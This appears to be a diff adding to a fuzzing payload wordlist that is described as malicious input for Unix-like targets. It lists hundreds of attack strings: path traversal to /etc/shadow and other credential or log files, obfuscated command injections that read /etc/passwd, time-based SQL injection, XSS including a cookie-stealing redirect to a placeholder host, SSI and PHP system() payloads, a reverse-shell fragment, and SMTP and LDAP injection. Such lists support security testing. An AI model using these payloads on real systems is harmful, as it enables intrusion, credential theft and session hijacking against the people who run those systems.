+/etc/init.d/apache
+/etc/init.d/apache2
+/etc/issue
+/etc/logrotate.d/ftp
+/etc/logrotate.d/httpd
+/etc/logrotate.d/proftpd
+/etc/logrotate.d/vsftpd.log
+/etc/mail/access
+/etc/mailman/mm_cfg.py
+/etc/make.conf
+/etc/master.passwd
+/etc/motd
+/etc/my.cnf
+/etc/mysql/my.cnf
+/etc/netconfig
+/etc/nsswitch.conf
+/etc/opt/ipf/ipf.conf
+/etc/opt/ipf/ipnat.conf
+/etc/passwd
+/etc/passwd%00
+/etc/php.d/dom.ini
+/etc/php.d/gd.ini
+/etc/php.d/imap.ini
+/etc/php.d/json.ini
+/etc/php.d/ldap.ini
+/etc/php.d/mbstring.ini
+/etc/php.d/mysql.ini
+/etc/php.d/mysqli.ini
+/etc/php.d/odbc.ini
+/etc/php.d/pdo_mysql.ini
+/etc/php.d/pdo_odbc.ini
+/etc/php.d/pdo_pgsql.ini
+/etc/php.d/pdo_sqlite.ini
+/etc/php.d/pdo.ini
+/etc/php.d/pgsql.ini
+/etc/php.d/xmlreader.ini
+/etc/php.d/xmlwriter.ini
+/etc/php.d/xsl.ini
+/etc/php.d/zip.ini
+/etc/php.ini
+/etc/php/apache/php.ini
+/etc/php/apache2/php.ini
+/etc/php/cgi/php.ini
+/etc/php/php.ini
+/etc/php/php4/php.ini
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/apache2/php.ini
+/etc/php4/cgi/php.ini
+/etc/php5/apache/php.ini
+/etc/php5/apache2/php.ini
+/etc/php5/cgi/php.ini
+/etc/postfix/mydomains
+/etc/proftp.conf
+/etc/proftpd/modules.conf
+/etc/protpd/proftpd.conf
+/etc/pure-ftpd.conf
+/etc/pure-ftpd/pure-ftpd.conf
+/etc/pure-ftpd/pure-ftpd.pdb
+/etc/pure-ftpd/pureftpd.pdb
+/etc/pureftpd.passwd
+/etc/pureftpd.pdb
+/etc/release
+/etc/resolv.conf
+/etc/rpc
+/etc/security/environ
+/etc/security/failedlogin
+/etc/security/group
+/etc/security/lastlog
+/etc/security/limits
+/etc/security/passwd
+/etc/security/user
+/etc/shadow
+/etc/ssh/sshd_config
+/etc/sudoers
+/etc/syslog.conf
+/etc/syslogd.conf
+/etc/system
+/etc/updatedb.conf
+/etc/utmp
+/etc/vfstab
+/etc/vhcs2/proftpd/proftpd.conf
+/etc/vsftpd.chroot_list
+/etc/vsftpd.conf
+/etc/vsftpd/vsftpd.conf
+/etc/wtmp
+/etc/wu-ftpd/ftpaccess
+/etc/wu-ftpd/ftphosts
+/etc/wu-ftpd/ftpusers
+/home/apache/conf/httpd.conf
+/home/apache/httpd.conf
+/home\bin\stable\apache\php.ini
+/home2\bin\stable\apache\php.ini
+/id 
+/index.html|id|
+/log/miscDir/accesslog
+/logs/access_log
+/logs/access.log
+/logs/error_log
+/logs/error.log
+/logs/pure-ftpd.log
+/master.passwd
+/NetServer\bin\stable\apache\php.ini
+/opt/apache/conf/httpd.conf
+/opt/apache2/conf/httpd.conf
+/opt/lampp/logs/access_log
+/opt/lampp/logs/access.log
+/opt/lampp/logs/error_log
+/opt/lampp/logs/error.log
+/opt/xampp/etc/php.ini
+/opt/xampp/logs/access_log
+/opt/xampp/logs/access.log
+/opt/xampp/logs/error_log
+/opt/xampp/logs/error.log
+/php\php.ini
+/PHP\php.ini
+/php4\php.ini
+/php5\php.ini
+/private/etc/httpd/httpd.conf
+/private/etc/httpd/httpd.conf.default
+/proc/cpuinfo
+/proc/interrupts
+/proc/loadavg
+/proc/meminfo
+/proc/mounts
+/proc/net/arp
+/proc/net/dev
+/proc/net/route
+/proc/net/tcp
+/proc/partitions
+/proc/self/cmdline
+/proc/self/environ
+/proc/self/status
+/proc/version
+/Program Files\Apache Group\Apache\conf\httpd.conf
+/Program Files\Apache Group\Apache\logs\access.log
+/Program Files\Apache Group\Apache\logs\error.log
+/Program Files\Apache Group\Apache2\conf\httpd.conf
+/Program Files\xampp\apache\conf\httpd.conf
+/root/.bash_history
+/root/.bash_logut
+/root/.ksh_history
+/root/.Xauthority
+/usr/apache/conf/httpd.conf
+/usr/apache2/conf/httpd.conf
+/usr/etc/pure-ftpd.conf
+/usr/lib/cron/log
+/usr/lib/php.ini
+/usr/lib/php/php.ini
+/usr/lib/security/mkuser.default
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache/conf/php.ini
+/usr/local/apache/httpd.conf
+/usr/local/apache/log
+/usr/local/apache/logs
+/usr/local/apache/logs/access_ log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/access. log
+/usr/local/apache/logs/access.log
+/usr/local/apache/logs/error_log
+/usr/local/apache/logs/error.log
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache2/httpd.conf
+/usr/local/apache2/logs/access_log
+/usr/local/apache2/logs/access.log
+/usr/local/apache2/logs/error_log
+/usr/local/apache2/logs/error.log
+/usr/local/apps/apache/conf/httpd.conf
+/usr/local/apps/apache2/conf/httpd.conf
+/usr/local/cpanel/logs
+/usr/local/cpanel/logs/access_log
+/usr/local/cpanel/logs/error_log
+/usr/local/cpanel/logs/license_log
+/usr/local/cpanel/logs/login_log
+/usr/local/cpanel/logs/stats_log
+/usr/local/etc/apache/conf/httpd.conf
+/usr/local/etc/apache/vhosts.conf
+/usr/local/etc/apache2/conf/httpd.conf
+/usr/local/etc/httpd/conf/httpd.conf
+/usr/local/etc/httpd/logs/access_log
+/usr/local/etc/httpd/logs/error_log
+/usr/local/etc/php.ini
+/usr/local/etc/pure-ftpd.conf
+/usr/local/etc/pureftpd.pdb
+/usr/local/httpd/conf/httpd.conf
+/usr/local/lib/php.ini
+/usr/local/php/httpd.conf
+/usr/local/php/httpd.conf.php
+/usr/local/php/lib/php.ini
+/usr/local/php4/httpd.conf
+/usr/local/php4/httpd.conf.php
+/usr/local/php4/lib/php.ini
+/usr/local/php5/httpd.conf
+/usr/local/php5/httpd.conf.php
+/usr/local/php5/lib/php.ini
+/usr/local/pureftpd/etc/pure-ftpd.conf
+/usr/local/pureftpd/etc/pureftpd.pdb
+/usr/local/pureftpd/sbin/pure-config.pl
+/usr/local/www/logs/thttpd_log
+/usr/local/Zend/etc/php.ini
+/usr/pkgsrc/net/pureftpd/
+/usr/ports/contrib/pure-ftpd/
+/usr/ports/ftp/pure-ftpd/
+/usr/ports/net/pure-ftpd/
+/usr/sbin/pure-config.pl
+/usr/spool/lp/log
+/usr/spool/mqueue/syslog
+/var/adm
+/var/adm/acct/sum/loginlog
+/var/adm/aculog
+/var/adm/aculogs
+/var/adm/crash/unix
+/var/adm/crash/vmcore
+/var/adm/cron/log
+/var/adm/dtmp
+/var/adm/lastlog
+/var/adm/lastlog/username
+/var/adm/log/asppp.log
+/var/adm/log/xferlog
+/var/adm/loginlog
+/var/adm/lp/lpd-errs
+/var/adm/messages
+/var/adm/pacct
+/var/adm/qacct
+/var/adm/ras/bootlog
+/var/adm/ras/errlog
+/var/adm/sulog
+/var/adm/SYSLOG
+/var/adm/utmp
+/var/adm/utmpx
+/var/adm/vold.log
+/var/adm/wtmp
+/var/adm/wtmpx
+/var/adm/X0msgs
+/var/apache/log
+/var/apache/logs
+/var/apache/logs/access_log
+/var/apache/logs/error_log
+/var/cpanel/cpanel.config
+/var/cron/log
+/var/lib/mlocate/mlocate.db
+/var/lib/mysql/my.cnf
+/var/local/www/conf/php.ini
+/var/lock/samba
+/var/log
+/var/log/access_log
+/var/log/access.log
+/var/log/acct
+/var/log/apache-ssl/access.log
+/var/log/apache-ssl/error.log
+/var/log/apache/access_log
+/var/log/apache/access.log
+/var/log/apache/error_log
+/var/log/apache/error.log
+/var/log/apache2/access_log
+/var/log/apache2/access.log
+/var/log/apache2/error_log
+/var/log/apache2/error.log
+/var/log/auth
+/var/log/auth.log
+/var/log/authlog
+/var/log/boot.log
+/var/log/cron.log
+/var/log/dmesg
+/var/log/error_log
+/var/log/error.log
+/var/log/exim_mainlog
+/var/log/exim_paniclog
+/var/log/exim_rejectlog
+/var/log/exim/mainlog
+/var/log/exim/paniclog
+/var/log/exim/rejectlog
+/var/log/ftp-proxy
+/var/log/ftp-proxy/ftp-proxy.log
+/var/log/ftplog
+/var/log/httpd/
+/var/log/httpd/access_log
+/var/log/httpd/access.log
+/var/log/httpd/error_log
+/var/log/httpd/error.log
+/var/log/httpsd/ssl_log
+/var/log/httpsd/ssl.access_log
+/var/log/kern.log
+/var/log/lastlog
+/var/log/lighttpd
+/var/log/maillog
+/var/log/message
+/var/log/messages
+/var/log/mysql.log
+/var/log/mysql/mysql-bin.log
+/var/log/mysql/mysql-slow.log
+/var/log/mysql/mysql.log
+/var/log/mysqld.log
+/var/log/mysqlderror.log
+/var/log/ncftpd.errs
+/var/log/ncftpd/misclog.txt
+/var/log/news
+/var/log/news.all
+/var/log/news/news
+/var/log/news/news.all
+/var/log/news/news.crit
+/var/log/news/news.err
+/var/log/news/news.notice
+/var/log/news/suck.err
+/var/log/news/suck.notice
+/var/log/poplog
+/var/log/POPlog
+/var/log/proftpd
+/var/log/proftpd.access_log
+/var/log/proftpd.xferlog
+/var/log/proftpd/xferlog.legacy
+/var/log/pure-ftpd/pure-ftpd.log
+/var/log/pureftpd.log
+/var/log/qmail
+/var/log/qmail/
+/var/log/samba
+/var/log/samba-log.%m
+/var/log/secure
+/var/log/smtpd
+/var/log/spooler
+/var/log/syslog
+/var/log/telnetd
+/var/log/thttpd_log
+/var/log/utmp
+/var/log/vsftpd.log
+/var/log/wtmp
+/var/log/xferlog
+/var/log/yum.log
+/var/lp/logs/lpNet
+/var/lp/logs/lpsched
+/var/lp/logs/requests
+/var/mysql.log
+/var/run/httpd.pid
+/var/run/mysqld/mysqld.pid
+/var/run/utmp
+/var/saf/_log
+/var/saf/port/log
+/var/spool/errors
+/var/spool/locks
+/var/spool/logs
+/var/spool/tmp
+/var/www/conf/httpd.conf
+/var/www/html/.htaccess
+/var/www/localhost/htdocs/.htaccess
+/var/www/log/access_log
+/var/www/log/error_log
+/var/www/logs/access_log
+/var/www/logs/access.log
+/var/www/logs/error_log
+/var/www/logs/error.log
+/var/www/sitename/htdocs/
+/var/www/vhosts/sitename/httpdocs/.htaccess
+/var/www/web1/html/.htaccess
+/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf
+/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
+/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf
+/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
+/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
+/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
+/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
+/Volumes/webBackup/opt/apache2/conf/httpd.conf
+/Volumes/webBackup/private/etc/httpd/httpd.conf
+/Volumes/webBackup/private/etc/httpd/httpd.conf.default
+/web.config
+/web/conf/php.ini
+/WINDOWS\php.ini
+/WINNT\php.ini
+/www/logs/proftpd.system.log
+/xampp\apache\bin\php.ini
+\
+\…..\\\…..\\\…..\\\
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\'
+\' waitfor delay \'00:02\' -- 
+\';waitfor delay \'00:02\' -- 
+\";alert('XSS');//
+\";sleep 3.jpg
+\"><img/src=1>.jpg
+\"blah
+\\
+\\' waitfor delay \\'00:02\\' -- 
+\\';waitfor delay \\'00:02\\' -- 
+\\/
+\\\\?\\
+\\\\*
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+\\n waitfor delay '00:02'
+\\n waitfor delay '00:02' -- 
+\\n waitfor delay \'00:02\'
+\\n waitfor delay \'00:02\' -- 
+\\n;waitfor delay '00:02'
+\\n;waitfor delay '00:02' -- 
+\\n;waitfor delay \'00:02\'
+\\n;waitfor delay \'00:02\' -- 
+\\n' waitfor delay '00:02' -- 
+\\n';waitfor delay '00:02' -- 
+\\n\\' waitfor delay \\'00:02\\' -- 
+\\n\\';waitfor delay \\'00:02\\' -- 
+\\r\\n waitfor delay '00:02'
+\\r\\n waitfor delay '00:02' -- 
+\\r\\n waitfor delay \'00:02\'
+\\r\\n waitfor delay \'00:02\' -- 
+\\r\\n;waitfor delay '00:02'
+\\r\\n;waitfor delay '00:02' -- 
+\\r\\n;waitfor delay \'00:02\'
+\\r\\n;waitfor delay \'00:02\' -- 
+\\r\\n' waitfor delay '00:02' -- 
+\\r\\n';waitfor delay '00:02' -- 
+\\r\\n\\' waitfor delay \\'00:02\\' -- 
+\\r\\n\\';waitfor delay \\'00:02\\' -- 
+\&apos;
+\0
+\0\0
+\0\0\0
+\00
+\00\00
+\00\00\00
+\FFFFFFFF
+\FFFFFFFF\
+\id
+\id;
+\id\
+\id|
+\n waitfor delay '00:02'
+\n waitfor delay '00:02' -- 
+\n waitfor delay \'00:02\'
+\n waitfor delay \'00:02\' -- 
+\n;waitfor delay '00:02'
+\n;waitfor delay '00:02' -- 
+\n;waitfor delay \'00:02\'
+\n;waitfor delay \'00:02\' -- 
+\n' waitfor delay '00:02' -- 
+\n';waitfor delay '00:02' -- 
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id\n
+\n/usr/bin/id|
+\n\' waitfor delay \'00:02\' -- 
+\n\';waitfor delay \'00:02\' -- 
+\nid
+\nid;
+\nid\n
+\nid|
+\nnetstat -a%\n
+\r\n waitfor delay '00:02'
+\r\n waitfor delay '00:02' -- 
+\r\n waitfor delay \'00:02\'
+\r\n waitfor delay \'00:02\' -- 
+\r\n;waitfor delay '00:02'
+\r\n;waitfor delay '00:02' -- 
+\r\n;waitfor delay \'00:02\'
+\r\n;waitfor delay \'00:02\' -- 
+\r\n' waitfor delay '00:02' -- 
+\r\n';waitfor delay '00:02' -- 
+\r\n\' waitfor delay \'00:02\' -- 
+\r\n\';waitfor delay \'00:02\' -- 
+\t
+\u\n\a\m\e \-\a
+\u003c
+\u003C
+\web.config
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x27UNION SELECT
+\x3c
+\x3C
+\x3D \x27
+\x3D \x3B'
+\xFFFFFFFF
+&
+& `id`
+& id
+& id &
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+&{cat,/etc/passwd}
+&/usr/bin/id&
+&& id
+&&{cat,/etc/passwd}
+&&/usr/bin/id&&
+&&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+&&cat%20/etc/passwd
+&&cat</etc/passwd
+&&cat$IFS/etc/passwd
+&&cat$u /etc$u/passwd$u
+&&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+&&id
+&&id&&
+&&ping+-c+10+127.0.0.1&&
+&#0000060
+&#0000060;
+&#000060
+&#000060;
+&#00060
+&#00060;
+&#0060
+&#0060;
+&#060
+&#060;
+&#10;
+&#10;&#13;
+&#13;
+&#13;&#10;
+&#60
+&#60;
+&#x000003c
+&#x000003C
+&#X000003c
+&#X000003C
+&#x000003c;
+&#x000003C;
+&#X000003c;
+&#X000003C;
+&#x00003c
+&#x00003C
+&#X00003c
+&#X00003C
+&#x00003c;
+&#x00003C;
+&#X00003c;
+&#X00003C;
+&#x0003c
+&#x0003C
+&#X0003c
+&#X0003C
+&#x0003c;
+&#x0003C;
+&#X0003c;
+&#X0003C;
+&#x003c
+&#x003C
+&#X003c
+&#X003C
+&#x003c;
+&#x003C;
+&#X003c;
+&#X003C;
+&#x03c
+&#x03C
+&#X03c
+&#X03C
+&#x03c;
+&#x03C;
+&#X03c;
+&#X03C;
+&#x3c
+&#x3C
+&#X3c
+&#X3C
+&#x3c;
+&#x3C;
+&#X3c;
+&#X3C;
+&apos;
+&apos;-alert(1)-&apos;.jpg
+&apos;%20OR
+&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+&cat%20/etc/passwd
+&cat</etc/passwd
+&cat$IFS/etc/passwd
+&cat$u /etc$u/passwd$u
+&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+&foo;
+&id
+&id&
+&lt
+&LT
+&lt;
+&LT;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;id;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+&quot;;id&quot;
+#
+# a wide sample of malicious input for unix-like targets
+#'
+#&apos;
+#xA
+#xA#xD
+#xD
+#xD#xA
+%
+%' or '0'='0
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%00
+%00 waitfor delay '00:02'
+%00 waitfor delay '00:02' -- 
+%00 waitfor delay \'00:02\'
+%00 waitfor delay \'00:02\' -- 
+%00;waitfor delay '00:02'
+%00;waitfor delay '00:02' -- 
+%00;waitfor delay \'00:02\'
+%00;waitfor delay \'00:02\' -- 
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+%00' waitfor delay '00:02' -- 
+%00';waitfor delay '00:02' -- 
+%00/
+%00/etc/passwd%00
+%00/etc/shadow%00
+%00\' waitfor delay \'00:02\' -- 
+%00\';waitfor delay \'00:02\' -- 
+%00\\' waitfor delay \\'00:02\\' -- 
+%00\\';waitfor delay \\'00:02\\' -- 
+%01%02%03%04%0a%0d%0aADSF
+%08x
+%0a
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+%0a uname -a %0a
+%0a waitfor delay '00:02'
+%0a waitfor delay '00:02' -- 
+%0a waitfor delay \'00:02\'
+%0a waitfor delay \'00:02\' -- 
+%0a whoami %0a
+%0a;waitfor delay '00:02'
+%0a;waitfor delay '00:02' -- 
+%0a;waitfor delay \'00:02\'
+%0a;waitfor delay \'00:02\' -- 
+%0a' waitfor delay '00:02' -- 
+%0a';waitfor delay '00:02' -- 
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0a\' waitfor delay \'00:02\' -- 
+%0a\';waitfor delay \'00:02\' -- 
+%0a\\' waitfor delay \\'00:02\\' -- 
+%0a\\';waitfor delay \\'00:02\\' -- 
+%0Acat%20/etc/passwd
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+%0Aid
+%0aid%0a
+%0Aid%0A
+%0d
+%0d%0a waitfor delay '00:02'
+%0d%0a waitfor delay '00:02' -- 
+%0d%0a waitfor delay \'00:02\'
+%0d%0a waitfor delay \'00:02\' -- 
+%0d%0a;waitfor delay '00:02'
+%0d%0a;waitfor delay '00:02' -- 
+%0d%0a;waitfor delay \'00:02\'
+%0d%0a;waitfor delay \'00:02\' -- 
+%0d%0a' waitfor delay '00:02' -- 
+%0d%0a';waitfor delay '00:02' -- 
+%0d%0a\' waitfor delay \'00:02\' -- 
+%0d%0a\';waitfor delay \'00:02\' -- 
+%0d%0a\\' waitfor delay \\'00:02\\' -- 
+%0d%0a\\';waitfor delay \\'00:02\\' -- 
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+%0d%0aX-Injection-Header:%20AttackValue
+%0Did
+%0Did%0D
+%20
+%20'sleep%2050'
+%20|
+%20$(sleep%2050)
+%20d
+%20n
+%20s
+%20x
+%21
+%22%0Awhoami%0A%22
+%22%20%60id%60
+%22%20%60id%60%20%23
+%22%20id
+%22%2C%0Asystem%28%27ls%27%29%0A%3B%22
+%22%2Csystem%28%27ls%27%29%3B%22
+%22%3Bcat%2B%2Fetc%2Fpasswd%2B%23
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%22i%22d
+%22id%22
+%24%28%2Fusr%2Fbin%2Fid%29
+%24%28%60cat%20%2Fetc%2Fpasswd%60%29
+%24%28%7Bcat%2C%2Fetc%2Fpasswd%7D%29
+%24%28cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%29
+%24%28cat%24IFS%2Fetc%2Fpasswd%29
+%24%28cat%24u%20%2Fetc%24u%2Fpasswd%24u%29
+%24%28cat%2520%2Fetc%2Fpasswd%29
+%24%28cat%3C%2Fetc%2Fpasswd%29
+%24%28echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%29
+%24%28id%29
+%24%3Bid
+%24%7B%40phpinfo%28%29%7D
+%24%7B%40system%28%22id%22%29%7D
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%2500
+%250a
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
+%253B%2524%257B%2540print%2528md5%2528%2522whoami0%2522%2529%2529%257D%253B
+%26
+%26 id %26
+%26%0Awhoami%0A%26
+%26%20%60id%60
+%26%20id
+%26%20id%20%26
+%26%20uname%20-a%20%26
+%26%26%20id
+%26%26%2Fusr%2Fbin%2Fid%26%26
+%26%26%7Bcat%2C%2Fetc%2Fpasswd%7D
+%26%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd
+%26%26cat%24IFS%2Fetc%2Fpasswd
+%26%26cat%24u%20%2Fetc%24u%2Fpasswd%24u
+%26%26cat%2520%2Fetc%2Fpasswd
+%26%26cat%3C%2Fetc%2Fpasswd
+%26%26dir
+%26%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd
+%26%26id
+%26%26id%26%26
+%26%2Fusr%2Fbin%2Fid%26
+%26%7Bcat%2C%2Fetc%2Fpasswd%7D
+%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd
+%26cat%24IFS%2Fetc%2Fpasswd
+%26cat%24u%20%2Fetc%24u%2Fpasswd%24u
+%26cat%2520%2Fetc%2Fpasswd
+%26cat%3C%2Fetc%2Fpasswd
+%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd
+%26id
+%26id%26
+%26lt%3B%21--%23exec%2520cmd%3D%26quot%3Bid%3B--%26gt%3B
+%27%0Aid%0A%27
+%27%0Awhoami%0A%27
+%27%20%60id%60
+%27%20%60id%60%20%23
+%27%20id
+%27%20or%201=1
+%27%27%0Awhoami%0A%27%27
+%27%27id
+%27%27id%27%27
+%27%27id%27%27%26
+%27i%27d
+%27id%27
+%28
+%28%0Awhoami%0A%29
+%28id
+%28id%29
+%28sy.%28st%29.em%29%28whoami%29%3B
+%29
+%29%3Bid
+%29%3Bid%3B
+%29%3Bid%7C
+%29%7Cid
+%29%7Cid%3B
+%29id%20
+%2A
+%2A%0Awhoami%0A
+%2A%0Awhoami%0A%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%2Aid%2A%2A
+%2A%7C
+%2Aid
+%2Aid%2A
+%2C
+%2C%0Awhoami%0A%2C
+%2C%20%60id%60
+%2C%20%60id%60%20%23
+%2C%20id
+%2Cid
+%2e%2e%2f
+%2F%3F%3F%3F%2F%3F%3Ft%2B%2F%3F%3F%3F%2F%3F%3Fss%3F%3F
+%2F%3Fin%2Fcat%2B%2Fet%3F%2Fpassw%3F
+%2Fbin%24u%2Fbash%24u%20%3Cip%3E%20%3Cport%3E
+%2Fid%20
+%3Aid
+%3B%0Awhoami%0A%3B
+%3B%20%60id%60
+%3B%20%60id%60%20%23
+%3B%20id
+%3B%24%7B%40print%28md5%28%22whoami%22%29%29%7D
+%3B%24%7B%40print%28md5%28whoami%29%29%7D
+%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%24u
+%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%2B%5C%23
+%3B%2Bcat%2B%2Fe%27tc%2Fpass%27wd
+%3B%2Fusr%2Fbin%2Fid%3B
+%3B%7Bcat%2C%2Fetc%2Fpasswd%7D
+%3B%7Cid%7C
+%3Bcat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd
+%3Bcat%24IFS%2Fetc%2Fpasswd
+%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u
+%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u
+%3Bcat%2520%2Fetc%2Fpasswd
+%3Bcat%2B%2Fetc%2Fpasswd
+%3Bcat%2B%2Fetc%2Fpasswd%2B%23
+%3Bcat%3C%2Fetc%2Fpasswd
+%3Becho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd
+%3Bid
+%3Bid%2Fn
+%3Bid%3B
+%3Bid%7C
+%3Bl%22s%24%7BIFS%7D-la
+%3Bphpinfo
+%3Bphpinfo%28%29%3B
+%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29
+%3Bsystem%28%27id%27%29
+%3Bunam%22e%24%7BIFS%7D-a
+%3Buname%20-a%3B
+%3C
+%3C%21--%23exec%20cmd%3D%22id%3B--%3E
+%3C%3F
+%3C%3Fphp%20system%28%22cat%20%2Fetc%2Fpasswd%22%29%3B%3F%3E
+%3Cid
+%3Cid%3B
+%3Cid%5Cn
+%3cscript%3ealert("XSS");%3c/script%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%5C
+%5C/
+%5C%0Awhoami
+%5C%0Awhoami%0A%5C
+%5Cid
+%5Cid%3B
+%5Cid%5C
+%5Cid%7C
+%5Cnid
+%5Cnid%5Cn
+%5Cu%5Cn%5Ca%5Cm%5Ce%20%5C-%5Ca
+%5Eid
+%60
+%60%0Aid%0A%60
+%60%2Fusr%2Fbin%2Fid%60
+%60%7Bcat%2C%2Fetc%2Fpasswd%7D%60
+%60cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%60
+%60cat%24IFS%2Fetc%2Fpasswd%60
+%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60
+%60cat%2520%2Fetc%2Fpasswd%60
+%60cat%3C%2Fetc%2Fpasswd%60
+%60echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%60
+%60id%60
+%60id%60%20%26
+%60id%60%26
+%7B%7B%20get_user_file%28%22%2Fetc%2Fpasswd%22%29%20%7D%7D
+%7Buname%2C-a%7D
+%7C
+%7C%0Awhoami
+%7C%0Awhoami%0A%7C
+%7C%20%60id%60
+%7C%20%60id%60%20%23
+%7C%20id
+%7C%2Fusr%2Fbin%2Fid%7C
+%7C%7Bcat%2C%2Fetc%2Fpasswd%7D
+%7C%7C%20id
+%7C%7C%2Fusr%2Fbin%2Fid%7C%7C
+%7C%7C%7Bcat%2C%2Fetc%2Fpasswd%7D
+%7C%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd
+%7C%7Ccat%24IFS%2Fetc%2Fpasswd
+%7C%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u
+%7C%7Ccat%2520%2Fetc%2Fpasswd
+%7C%7Ccat%3C%2Fetc%2Fpasswd
+%7C%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd
+%7C%7Cid
+%7C%7Cid%0A
+%7C%7Cid%3B
+%7C%7Cid%7C
